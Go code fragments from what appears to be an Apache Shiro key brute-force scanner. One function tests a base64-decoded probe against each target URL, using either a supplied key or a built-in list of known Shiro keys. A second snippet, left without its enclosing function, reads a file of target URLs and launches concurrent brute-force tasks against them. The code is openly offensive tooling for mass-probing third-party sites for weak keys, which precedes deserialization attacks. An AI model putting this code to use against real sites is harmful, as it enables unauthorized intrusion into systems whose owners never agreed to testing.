func KeyCheck(TargetUrl string) (bool, string) {
Content, _ := base64.StdEncoding.DecodeString(CheckContent)
isFind, Result := false, ""
if SKey != "" {
time.Sleep(time.Duration(Interval) * time.Second)
isFind, Result = FindTheKey(SKey, Content, TargetUrl)
} else {
isFind = false
for i := range ShiroKeys { // 遍历Key列表
time.Sleep(time.Duration(Interval) * time.Second)
isFind, Result = FindTheKey(ShiroKeys[i], Content, TargetUrl)
if isFind {
break // 找到任意Key既返回结果
}
}
}
return isFind, Result
}
f, err := os.Open(UrlFile)
if err != nil {
panic(err)
}
defer f.Close()
rd := bufio.NewReader(f)
startTime := time.Now()
for {
UnFormatted, _, err := rd.ReadLine() // 逐行读取目标
if err == io.EOF {
break
}
TargetUrl := string(UnFormatted)
if !strings.Contains(TargetUrl, "http://") && !strings.Contains(TargetUrl, "https://") {
TargetUrl = "https://" + TargetUrl
}
wg.Add(1)
pool.Submit(func() { // 提交并发爆破任务
StartTask(string(TargetUrl))
wg.Done()
})
}
wg.Wait()
